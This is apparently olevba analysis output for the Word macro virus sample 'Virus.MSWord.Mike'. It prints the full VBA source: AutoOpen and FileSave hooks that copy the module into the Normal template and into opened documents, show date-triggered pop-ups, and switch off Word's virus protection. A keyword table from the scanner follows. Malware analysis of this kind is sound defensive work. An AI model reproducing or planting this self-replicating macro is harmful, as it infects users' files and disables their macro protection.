olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mike
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mike - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mike.bas 
in file: Virus.MSWord.Mike - OLE stream: 'Macros/VBA/Mike'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/22/97 by Michael John G. Lopez"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Mike.AutoOpen"
Call JollyWanderer
End Sub

Sub JollyWanderer()
CheckMe = 0
For I = 1 To WordBasic.[countmacros](0)
If WordBasic.[macroname$](I, 0) = "Mike" Then CheckMe = 1
Next I

If CheckMe = 1 Then GoTo CheckDoc

On Error Resume Next
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Mike", wdOrganizerObjectProjectItems

CheckDoc:
CheckMe = 0
For I = 1 To WordBasic.[countmacros](1)
If WordBasic.[macroname$](I, 1) = "Mike" Then CheckMe = 1
Next I

If CheckMe = 1 Then GoTo CheckTrigger

On Error Resume Next
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Mike", wdOrganizerObjectProjectItems
ActiveDocument.Save

CheckTrigger:

If Day(Now()) = 16 And Month(Now()) = 6 Then
    MsgBox "Happy Birthday Ming...", , "Jolly Wanderer"
End If

If Day(Now()) = 18 And Month(Now()) = 3 Then
    MsgBox "Happy Birthday Dee...", , "Jolly Wanderer"
End If

If Day(Now()) = 25 And Month(Now()) = 12 Then
    MsgBox "It's Christmas.  Quit Working and ENJOY!", , "Jolly Wanderer"
End If

Options.VirusProtection = False
End Sub
Sub FileSave()
Attribute FileSave.VB_Description = "Macro created 03/31/99 by Michael John G. Lopez"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.Mike.FileSave"
Call JollyWanderer
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

